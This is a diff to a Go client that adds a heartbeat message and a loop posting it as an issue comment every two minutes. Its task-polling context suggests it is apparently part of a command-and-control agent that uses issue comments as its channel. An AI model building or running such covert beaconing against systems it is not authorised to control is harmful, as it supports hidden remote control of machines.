@@ -92,6 +92,48 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 	return result
 }
 
+// heartbeat to check health of client
+
+func (c *Client) createHeartbeat() GundoMessage {
+	// new gundo mesaget ype of heartbeat
+	return GundoMessage{
+		Type:      "heartbeat",
+		ClientID:  c.ID,
+		Status:    "online",
+		Timestamp: time.Now().UTC().Format(time.RFC3339),
+	}
+}
+
+func (c *Client) heartbeatLoop(issueNumber int) {
+
+	// Send one immediately when the client starts.
+	heartbeat := c.createHeartbeat()
+
+	if err := createComment(issueNumber, heartbeat); err != nil {
+		fmt.Printf("Heartbeat failed: %v\n", err)
+	} else {
+		fmt.Println("[+] Heartbeat sent")
+	}
+
+	// ticker to track the time on the heartbeat
+
+	ticker := time.NewTicker(2 * time.Minute)
+	defer ticker.Stop()
+
+	// happens based on range of the ticker to create a new heatbeat message
+	for range ticker.C {
+		heartbeat := c.createHeartbeat()
+
+		// if the heartbeat comment cant be made then the system is gone
+		if err := createComment(issueNumber, heartbeat); err != nil {
+			fmt.Printf("Heartbeat failed: %v\n", err)
+			continue
+		}
+
+		fmt.Println("[+] Heartbeat sent")
+	}
+}
+
 func (c *Client) pollTasks(issueNumber int) {
 
 	// Get the comments that already exist when the client starts.
